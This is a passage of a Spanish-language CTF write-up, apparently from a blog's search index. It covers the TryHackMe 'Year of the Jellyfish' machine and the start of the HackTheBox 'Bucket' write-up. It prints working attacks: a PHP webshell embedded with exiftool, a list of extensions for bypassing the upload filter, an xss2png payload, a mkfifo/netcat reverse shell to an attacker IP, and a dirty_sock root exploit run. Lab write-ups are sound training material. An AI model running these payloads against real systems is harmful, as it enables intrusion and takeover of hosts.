action=\u0026#34;https://monitorr.robyns-petshop.thm/assets/php/upload.php\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; Select image to upload: \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;fileToUpload\u0026#34; id=\u0026#34;fileToUpload\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Upload Image\u0026#34; name=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Al cambiar la extension de una imagen vemos un ERROR.\nNota:\nSe muestran dos metodos ya que por alguna razon no funcionó dos veces el mismo \u0026ldquo;metodo\u0026rdquo; al iniciar diferentes instancias de la maquina.\nCOMMENT - 1 Agregamos codigo php para ejecucion de comandos en los metadatos de una imagen como en Networked - HTB pero no funcionó al intentar cambiar de extension manualmente, aunque la imagen .JPG si subió.\n1 2 exiftool -Comment=\u0026#39;\u0026lt;?php system($_GET[\u0026#34;cmd\u0026#34;]); ?\u0026gt;\u0026#39; batman.jpg cp batman.jpg batman.jpg.php Creamos un wordlist a partir de las diferentes extensiones presentadas en HackTricks para usarlas en Intruder.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 # extensiones .php2 .php3 .php4 .php5 .php6 .php7 .phps .phps .pht .phtm .phtml .pgif .shtml .htaccess .phar .inc .pHp5 .Php5 .pHp5 .phpJunk123png .pHp5 .php%00 .php\\x00 .php%0a .php%0d%0a .php .php%00.png%00.jpg .pphphp .php%00.gif .pHp .pHP5 .PhAr Agregamos dos marcadores junto a la extension JPG, tambien desactivamos la opcion de codificacion de los payloads ya que el wordlist contiene caracteres para agregar null bytes.\nTras realizar el ataque logramos subir la misma imagen con diferentes extensiones.\nAunque solo dos de ellas (.pHp, .phar) funcionaron.\nIDAT CHUNKS PNG - 2 Encontramos una pagina la cual genera una imagen insertando \u0026ldquo;codigo\u0026rdquo; dentro del IDAT CHUNKS de una imagen PNG, aunque solamente permite utilizar mayusculas y es muy limitado al generar nuestro payload, aunque es posible capturar la solicitud y cambiar el codigo en burpsuite. De igual forma existe una herramienta - XSS2PNG con la cual es posible crear imagenes con este mismo \u0026ldquo;metodo\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ┌──(kali㉿kali)-[~/thm/jellyfish/tmp] └─$ python3 xss2png.py -p \u0026#34;\u0026lt;?php echo system(\\$_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt;\u0026#34; -o cmd.png ____ __ _____ ___|___ \\ _ __ _ __ __ _ \\ \\/ / __/ __| __) | \u0026#39;_ \\| \u0026#39;_ \\ / _` | \u0026gt; \u0026lt;\\__ \\__ \\/ __/| |_) | | | | (_| | /_/\\_\\___/___/_____| .__/|_| |_|\\__, | |_| |___/ PNG IDAT chunks XSS payload generator [i] Using payload: \u0026lt;?PHP ECHO SYSTEM($_GET[\u0026#39;CMD\u0026#39;]); ?\u0026gt; [i] Generating final PNG output [!] PNG output saved as: cmd.png ┌──(kali㉿kali)-[~/thm/jellyfish/tmp] └─$ xxd cmd.png 00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0020 0000 0020 0802 0000 00fc 18ed ... ... ........ 00000020: a300 0000 6e49 4441 5478 9c63 fc3c 3f50 ....nIDATx.c.\u0026lt;?P 00000030: 4850 2045 4348 4f20 5359 5354 454d 2824 HP ECHO SYSTEM($ 00000040: 5f47 4554 5b27 434d 4427 5d29 3b20 3f3e _GET[\u0026#39;CMD\u0026#39;]); ?\u0026gt; 00000050: 20e0 96c4 ad19 079f cbfd f876 f349 d023 ..........v.I.# 00000060: eeab 9f98 9e6b 7af1 3d39 cdf6 cbf2 dfd3 .....kz.=9...... 00000070: 070e 8cfa 9cbe 3c2c 1cbe a919 8c0c a360 ......\u0026lt;,.......` 00000080: 148c 8251 300a 46c1 2818 05a3 6014 8c82 ...Q0.F.(...`... 00000090: a10b 00ee a01d 02f0 116e 5900 0000 0049 .........nY....I 000000a0: 454e 44ae 4260 82 END.B`. . De la misma manera cambiamos la extension esta vez a phar, al ejecutar comandos utilizar el parametro en mayuscula (CMD).\n1 2 3 4 5 6 7 8 ┌──(kali㉿kali)-[~/thm/jellyfish/tmp] └─$ curl -s \u0026#34;https://monitorr.robyns-petshop.thm/assets/data/usrimg/z.png.phar?CMD=id\u0026#34; -k -o /dev/shm/o \u0026amp;\u0026amp; cat /dev/shm/o PNG IHDR nIDATxcuid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) vI#kz=9\u0026lt;, `Q0 F(` SHELL - WWW-DATA Intentamos ejecutar diferentes shell inversas en diferentes lenguajes utilizando la webshell, pero nunca se ejecutó alguna, tambien intentamos utilizar ngrok ya que en la descripcion de la maquina mencionaba que la IP era publica \u0026ldquo;Be warned \u0026ndash; this box deploys with a public IP\u0026hellip;\u0026rdquo; aunque no funcionó.\nDB \u0026amp; FLAG1 En el directorio /var/www/monitorr encontramos la base de datos de monitorr que contiene una contraseña la cual no logramos crackear, además encontramos nuestra primera flag: flag1.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # cmd=ls -lah ../../../ sqlite\u0026gt; .open datausers.db sqlite\u0026gt; .tables users sqlite\u0026gt; .schema users CREATE TABLE `users` ( `user_id` INTEGER PRIMARY KEY, `user_name` varchar(64), `user_password_hash` varchar(255), `user_email` varchar(64)); sqlite\u0026gt; select * from users; 1|admin|$2y$10$q1BI3CSqToALH2Q1r2weLeRpyU7QbonizeVxJnPIieo/drbRSzVTa| sqlite\u0026gt; # cmd=ls -lah ../../../../; cat ../../../../flag1.txt total 24K drwxr-xr-x 5 root root 4.0K Apr 11 23:11 . drwxr-xr-x 14 root root 4.0K Apr 9 23:45 .. drwxr-xr-x 9 root root 4.0K Apr 11 17:00 dev -r-------- 1 www-data www-data 38 Apr 11 23:11 flag1.txt drwxr-xr-x 9 root root 4.0K Apr 11 14:38 html drwxr-xr-x 4 www-data www-data 4.0K Apr 11 14:24 monitorr THM{YjljMDYyZWUxYmQwMTkxYjNlMDY4YmY5} APACHE *.CONF Tambien dentro de los archivos de configuracion de apache vemos una \u0026ldquo;contraseña\u0026rdquo; encriptada relacionada al subdominio dev.* y que segun parece pertenece a robyn aunque no logramos crackear esta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # cmd=ls -lah /etc/apache2/sites-av*; cat /etc/apache2/sites-av*/dev*;cat /etc/apache2/htpasswd total 24K drwxr-xr-x 2 root root 4.0K Apr 17 21:38 . drwxr-xr-x 8 root root 4.0K Apr 11 14:43 .. -rw-r--r-- 1 root root 670 Apr 17 21:38 000-default.conf -rw-r--r-- 1 root root 451 Apr 17 21:38 beta.conf -rw-r--r-- 1 root root 608 Apr 17 21:38 dev.conf -rw-r--r-- 1 root root 457 Apr 17 21:38 monitorr.conf \u0026lt;VirtualHost *:80\u0026gt; ServerName dev.robyns-petshop.thm Redirect / https://dev.robyns-petshop.thm/ \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:443\u0026gt; ServerName dev.robyns-petshop.thm ServerAdmin webmaster@localhost DocumentRoot /var/www/dev \u0026lt;Directory \u0026#34;/var/www/dev/business\u0026#34;\u0026gt; AuthType Basic AuthName \u0026#34;Business Credentials Please\u0026#34; AuthUserFile \u0026#34;/etc/apache2/htpasswd\u0026#34; Require valid-user \u0026lt;/Directory\u0026gt; SSLCertificateFile /etc/ssl/certs/webserver.crt SSLCertificateKeyFile /etc/ssl/private/webserver.key ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; robyn:$apr1$tMFlj08b$5VCOhI2see0L0WRU8Mn.b. LINPEAS Realizamos una enumeracion utilizando linpeas.sh lo que permitio obtener informacion inportante:\nNetcat está en la maquina aunque esta como netcat y no nc como la mayoria de comandos para shell inversa que utilizan netcat. Vemos que existen sockets que son ejecutados por root en este caso snapd. Existe reglas en iptables las cuales permiten \u0026ldquo;comunicacion\u0026rdquo; unicamente a los puertos 443,80 desde fuera-hacia-adentro y viceversa (INPUT-OUTPUT), por lo que podriamos utilizar uno de estos puertos para obtener una shell. El puerto SSH es el 22222. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 [+] Useful software /bin/netcat [... REDACTED ...] [+] HTTP sockets [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets Socket /run/snapd.socket owned by root uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;sync\u0026#34;,\u0026#34;status-code\u0026#34;:200,\u0026#34;status\u0026#34;:\u0026#34;OK\u0026#34;,\u0026#34;result\u0026#34;:[\u0026#34;TBD\u0026#34;]} Socket /run/snapd-snap.socket owned by root uses HTTP. Response to /index: {\u0026#34;type\u0026#34;:\u0026#34;error\u0026#34;,\u0026#34;status-code\u0026#34;:401,\u0026#34;status\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;result\u0026#34;:{\u0026#34;message\u0026#34;:\u0026#34;access denied\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;login-required\u0026#34;}} [... REDACTED ...] [+] Iptables rules *filter :INPUT DROP [0:0] :FORWARD ACCEPT [0:0] :OUTPUT DROP [6:1044] -A INPUT -i lo -j ACCEPT -A INPUT -p tcp -m multiport --dports 21,80,443,22,22222,8000,8096 -j ACCEPT -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT -A OUTPUT -o lo -j ACCEPT -A OUTPUT -p tcp -m multiport --dports 443,445,80,25,53 -j ACCEPT -A OUTPUT -p udp -m udp --dport 53 -j ACCEPT -A OUTPUT -p icmp -j ACCEPT COMMIT *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT [... REDACTED ...] [+] Searching ssl/ssh files Port 22222 ChallengeResponseAuthentication no --\u0026gt; /etc/hosts.allow file found, read the rules: /etc/hosts.allow [... REDACTED ...] SHELL Con la informacion anterior modificamos los comandos para shell inversa que utilizan nc a netcat y hacia el puerto 80, unicamente funcionó con Netcat OpenBsd.\n1 2 3 4 5 6 # Netcat OpenBsd # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|netcat 10.2.30.132 80 \u0026gt;/tmp/f # BURPSUITE GET /assets/data/usrimg/idat.png.phar?cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|netcat 10.2.30.132 80 \u0026gt;/tmp/f HTTP/1.1 # BURPSUITE \u0026gt;\u0026gt; CTRL + U -\u0026gt; REV SHELL GET /assets/data/usrimg/idat.png.phar?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2\u0026gt;%261|netcat+10.2.30.132+80+\u0026gt;/tmp/f HTTP/1.1 \u0026hellip; logramos obtener acceso a la maquina.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ╭─kali@kali ~/thm/jellyfish/tmp ╰─➤ sudo rlwrap nc -lvvp 80 listening on [any] 80 ... connect to [10.2.30.132] from 10.10.143.206 [10.10.143.206] 42558 /bin/sh: 0: can\u0026#39;t access tty; job control turned off which python3 /usr/bin/python3 python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami;id;pwd whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/monitorr/assets/data/usrimg www-data@petshop:/var/www/monitorr/assets/data/usrimg$ PRIVILEGE ESCALATION Se mencionó en LINPEAS que se encontraron sockets (/run/snapd.socket, /run/snapd-snap.socket) que son \u0026ldquo;ejecutados\u0026rdquo; y dueño de root, por lo que investigamos sobre estos, encontramos exploits (1,2) que están relacionados a la vulnerabilidad dirty_sock de la API de snapd. Verificamos la version de snap y vemos que esta en el \u0026ldquo;rango\u0026rdquo; de versiones afectadas.\n1 2 3 4 5 6 7 8 www-data@petshop:/$ snap version snap version snap 2.32.5+18.04 snapd 2.32.5+18.04 series 16 ubuntu 18.04 kernel 4.15.0-140-generic www-data@petshop:/$ La maquina tiene acceso a internet por lo que descargamos el exploit de dirty_sockv2 para no crear una cuenta en ubuntu y que la explotacion sea sin depender de una cuenta (0xdf - Playing with Dirty Sock). Utilizando este exploit logramos obtener acceso root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 www-data@petshop:/dev/shm$ python3 dirty_02.py ___ _ ____ ___ _ _ ____ ____ ____ _ _ | \\ | |__/ | \\_/ [__ | | | |_/ |__/ | | \\ | | ___ ___] |__| |___ | \\_ (version 2) //=========[]==========================================\\\\ || R\u0026amp;D || initstring (@init_string) || || Source || https://github.com/initstring/dirty_sock || || Details || https://initblog.com/2019/dirty-sock || \\\\=========[]==========================================// [+] Slipped dirty sock on random socket file: /tmp/vlwffnkrbg;uid=0; [+] Binding to socket file... [+] Connecting to snapd API... [+] Deleting trojan snap (and sleeping 5 seconds)... [+] Installing the trojan snap (and sleeping 8 seconds)... [+] Deleting trojan snap (and sleeping 5 seconds)... ******************** Success! You can now `su` to the following account and use sudo: username: dirty_sock password: dirty_sock ******************** www-data@petshop:/dev/shm$ su dirty_sock Password: dirty_sock To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. dirty_sock@petshop:/dev/shm$ whoami; id dirty_sock uid=1001(dirty_sock) gid=1001(dirty_sock) groups=1001(dirty_sock),27(sudo) dirty_sock@petshop:/dev/shm$ cd /root bash: cd: /root: Permission denied dirty_sock@petshop:/dev/shm$ sudo su Password: dirty_sock root@petshop:/dev/shm# cd /root root@petshop:~# ls -lah total 24K drwx------ 3 root root 4.0K Apr 29 08:52 . drwxr-xr-x 23 root root 4.0K Apr 9 23:56 .. lrwxrwxrwx 1 root root 9 Apr 10 23:09 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3.1K Apr 9 2018 .bashrc -rw-r--r-- 1 root root 148 Aug 17 2015 .profile -r-------- 1 root root 38 Apr 11 23:12 root.txt drwxr-xr-x 3 root root 4.0K Apr 29 08:52 snap root@petshop:~# cat root.txt THM{ZWM5N2ViY2QxNjE4MjkxOWRiYWQ4NjUx} root@petshop:~# ANEXO SSH HONEYPOT Mientrar realizabamos una enumeracion con la webshell encontramos que el puerto 22 es un honeypot.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # cmd=ls -lah /opt/ssh-honeypot total 76K drwxr-xr-x 7 root root 4.0K Apr 11 02:07 . drwxr-xr-x 4 root root 4.0K Apr 16 19:31 .. drwxr-xr-x 8 root root 4.0K Apr 11 02:03 .git -rw-r--r-- 1 root root 69 Apr 11 02:03 .gitignore -rw-r--r-- 1 root root 190 Apr 11 02:03 CHANGELOG.md -rw-r--r-- 1 root root 255 Apr 11 02:03 INSTALL.md -rw-r--r-- 1 root root 1.1K Apr 11 02:03 LICENSE.md -rw-r--r-- 1 root root 625 Apr 11 02:05 Makefile -rw-r--r-- 1 root root 312 Apr 11 02:03 MakefileOSX -rw-r--r-- 1 root root 2.1K Apr 11 02:03 README.md -rw-r--r-- 1 root root 49 Apr 11 02:03 TODO.md drwxr-xr-x 2 root root 4.0K Apr 11 02:05 bin drwxr-xr-x 3 root root 4.0K Apr 11 02:03 docker drwxr-xr-x 2 root root 4.0K Apr 11 02:03 scripts drwxr-xr-x 2 root root 4.0K Apr 11 02:03 src -rw-r--r-- 1 root root 95 Apr 11 02:06 ssh-honeypot.log -rw------- 1 root root 1.7K Apr 11 02:05 ssh-honeypot.rsa -rw-r--r-- 1 root root 394 Apr 11 02:05 ssh-honeypot.rsa.pub -rw-r--r-- 1 root root 357 Apr 11 02:07 ssh-honeypot.service # cmd=ps -ef | grep ssh-honeypot nobody 915 1 0 04:24 ? 00:00:00 /opt/ssh-honeypot/bin/ssh-honeypot -p 22 -r /opt/ssh-honeypot/ssh-honeypot.rsa -u nobody -l /var/log/ssh-honeypot.log -f /var/run/ssh-honeypot.pid -d nobody 19715 915 0 07:22 ? 00:00:00 /opt/ssh-honeypot/bin/ssh-honeypot -p 22 -r /opt/ssh-honeypot/ssh-honeypot.rsa -u nobody -l /var/log/ssh-honeypot.log -f /var/run/ssh-honeypot.pid -d www-data 19717 18702 0 07:22 ? 00:00:00 sh -c ps -ef | grep ssh-honeypot www-data 19719 19717 0 07:22 ? 00:00:00 grep ssh-honeypot UPLOAD.PHP MODIFICADO Encontramos tambien el archivo upload.php el cual fue modificado y no aceptaba archivos con extension .php, además debia enviarse la cookie isHuman=1 sin esto el archivo no era aceptado lo cual no tomamos en cuenta en el exploit y la extension de la imagen :(.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;?php $allowedExts = [\u0026#34;jpg\u0026#34;, \u0026#34;png\u0026#34;, \u0026#34;gif\u0026#34;, \u0026#34;jpeg\u0026#34;, \u0026#34;bmp\u0026#34;]; $target_dir = \u0026#34;../data/usrimg/\u0026#34;; $target_file = $target_dir . basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]); $uploadOk = 1; $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION)); $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]) \u0026amp;\u0026amp; !strstr($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;], \u0026#34;php\u0026#34;) \u0026amp;\u0026amp; in_array(explode(\u0026#34;.\u0026#34;, $_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;])[1], $allowedExts); $rawfile = $_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;]; echo \u0026#34;\u0026lt;div id=\u0026#39;uploadreturn\u0026#39;\u0026gt;\u0026#34;; if ($_COOKIE[\u0026#34;isHuman\u0026#34;] != true){ echo \u0026#34;You are an exploit.\u0026#34;; echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; $uploadOk = 0; } else if($check !== false) { echo \u0026#34;File \u0026#34; . $rawfile . \u0026#34; is an image: \u0026#34; . $check[\u0026#34;mime\u0026#34;] ; echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;\u0026lt;div id=\u0026#39;uploaderror\u0026#39;\u0026gt;\u0026#34;; echo \u0026#34;ERROR: \u0026#34; . $rawfile . \u0026#34; is not an image or exceeds the webserver’s upload size limit.\u0026#34;; echo \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; $uploadOk = 0; } Aunque burpsuite si lo tomo en cuenta.\n","description":"Year of the Jellyfish es una maquina de TryHackMe, descubrimos dominios y subdominios con SSLSCAN lo que nos permitio encontrar una vulnerabilidad en Monitorr, se muestran dos formas para realizar bypass al filtro de ficheros lo que permitio obtener acceso. Finalmente ejecutamos Linpeas lo que nos guió una vulnerabilidad en snapd la cual explotamos para obtener acceso privilegiado.","id":67,"section":"posts","tags":["monitorr 1.7.6m","sslscan","webshell","metadata","exiftool","idat chunks","xss2png","linpeas","dirty_sock"],"title":"TryHackMe - Year of the Jellyfish","uri":"https://sckull.github.io/posts/jellyfish/"},{"content":"\rBucket es una maquina de HackTheBox, encontramos un S3 con mala configuracion de autenticacion donde subimos una shell inversa en PHP. Encontramos DynamoDB localmente con credenciales para realizar movimiento lateral. Para la escalada de privilegios aprovechamos que Pd4Cmd genera PDFs con informacion de DynamoDB, en este ultimo insertamos HTML para obtener la clave privada de SSH de root.\nInformacion de la Maquina Nombre Bucket OS Linux Puntos 30 Dificultad Media IP 10.10.10.212 Maker MrR3boot\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.7, 7.1, 4.2, 5.8, 2.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 10, 4, 6, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # Nmap 7.91 scan initiated Fri Mar 19 18:25:42 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.10.212 Warning: 10.10.10.212 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.094s latency). Not shown: 40661 closed ports, 24872 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Mar 19 18:26:54 2021 -- 1 IP address (1 host up) scanned in 72.43 seconds # Nmap 7.91 scan initiated Fri Mar 19 18:27:14 2021 as: nmap -p 22,80 -sV -sC -oN serviceports 10.10.10.212 Nmap scan report for 10.10.10.212 (10.10.10.212) Host is up (0.070s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://bucket.htb/ Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Mar 19 18:27:24 2021 -- 1 IP address (1 host up) scanned in 9.80 seconds HTTP Al intentar visitar el puerto 80 nos redirigia al dominio bucket.htb el cual agregamos en el archivo /etc/hosts.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 HTTP/1.1 302 Found Date: Sat, 20 Mar 2021 00:03:45 GMT Server: Apache/2.4.41 (Ubuntu) Location: http://bucket.htb/ Content-Length: 280 Content-Type: text/html; charset=iso-8859-1 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://bucket.htb/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Al visitar la pagina encontramos una pagina web con una lista de anuncios de \u0026ldquo;servicios\u0026rdquo;, cada una de estas estaba listada con una imagen la cual no cargaba. Al revisar el codigo fuente de las imagenes encontramos un sub dominio el cual agregamos nuevamente al archivo /etc/hosts.\nGOBUSTER Realizamos una enumeracion de directorios y archivos en el dominio bucket.htb y s3.bucket.htb.\n1 2 3 4 5 #bucket.htb ┌──(kali㉿kali)-[~/htb/bucket] └─$ gobuster dir -u http://bucket.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -q -x php,html,txt,xmlb /index.html (Status: 200) /server-status (Status: 403) 1 2 3 4 5 6 #s3.bucket.htb ┌──(kali㉿kali)-[~/htb/bucket] └─$ gobuster dir -u s3.bucket.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,xml,js -q /health (Status: 200) /shell (Status: 200) /server-status (Status: 403) AWS BUCKET En el dominio \u0026ldquo;principal\u0026rdquo; solamente encontramos la pagina estatica. En el subdmominio encontramos dos direcciones, en la primera encontramos que aparentemente estan corriendo \u0026lsquo;s3\u0026rsquo; y \u0026lsquo;dynamodb\u0026rsquo;.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/htb/bucket] └─$ curl -X GET -s http://s3.bucket.htb/health {\u0026#34;services\u0026#34;: {\u0026#34;s3\u0026#34;: \u0026#34;running\u0026#34;, \u0026#34;dynamodb\u0026#34;: \u0026#34;running\u0026#34;}} ──(kali㉿kali)-[~/htb/bucket] └─$ curl -X GET -s http://s3.bucket.htb/s3 {\u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;} ┌──(kali㉿kali)-[~/htb/bucket] └─$ curl -X GET -s http://s3.bucket.htb/dynamodb {\u0026#34;status\u0026#34;: \u0026#34;running\u0026#34;} Para la segunda direccion fue diferente ya que redirigía hacia otra direccion http://444af250749d:4566/shell/, la cual tiene \u0026ldquo;disponible\u0026rdquo; o \u0026ldquo;permitidos\u0026rdquo; algunos metodos HTTP.\n1 2 3 4 5 6 7 8 9 10 HTTP/1.1 200 Date: Sat, 20 Mar 2021 00:07:29 GMT Server: hypercorn-h11 content-type: text/html; charset=utf-8 content-length: 0 refresh: 0; url=http://444af250749d:4566/shell/ access-control-allow-origin: * access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging access-control-expose-headers: x-amz-version-id Ingresamos direcciones random y encontramos un mensaje de error, despues de investigar sobre este error encontramos que está relacionado con AWS S3 Buckets.\n1 2 3 4 5 6 7 8 #http://s3.bucket.htb/dynamodb/hello \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Error\u0026gt; \u0026lt;Code\u0026gt;NoSuchBucket\u0026lt;/Code\u0026gt; \u0026lt;Message\u0026gt;The specified bucket does not exist\u0026lt;/Message\u0026gt; \u0026lt;BucketName\u0026gt;dynamodb\u0026lt;/BucketName\u0026gt; \u0026lt;RequestID\u0026gt;7a62c49f-347e-4fc4-9331-6e8eEXAMPLE\u0026lt;/RequestID\u0026gt; \u0026lt;/Error\u0026gt; En el post se especifica que se puede utilizar la API de Amazon S3 o la consola AWS para realizar operaciones de implementacion, creacion y/o subida de objetos a un bucket.\nIn terms of implementation, buckets and objects are AWS resources, and Amazon S3 provides APIs for you to manage them. For example, you can create a bucket and upload objects using the Amazon S3 API. You can also use the Amazon S3 console to perform these operations. The console uses the Amazon S3 APIs to send requests to Amazon S3.\nTambien encontramos que pueden existir malas configuraciones en un bucket las cuales puedan permitir acceder a informacion en este.\nRealizamos la instalacion y configuracion de aws cli, utilizamos la configuracion de ejemplo. Encontramos que existe un bucket llamado adserver y el bucket no está configurado correctamente ya que no solicita ningun tipo de autenticacion o mensaje de acceso.\n1 2 3 4 5 6 7 8 9 10 ──(kali㉿kali)-[~/htb/bucket] └─$ aws configure AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY Default region name [None]: us-west-2 Default output format [None]: json ┌──(kali㉿kali)-[~/htb/bucket] └─$ aws s3 ls --endpoint-url http://s3.bucket.htb/ 2021-03-19 20:31:08 adserver WWW-DATA - USER Listamos los permisos del bucket y encontramos que el \u0026ldquo;usuario\u0026rdquo; es \u0026ldquo;webfile\u0026rdquo; y que tiene permisos 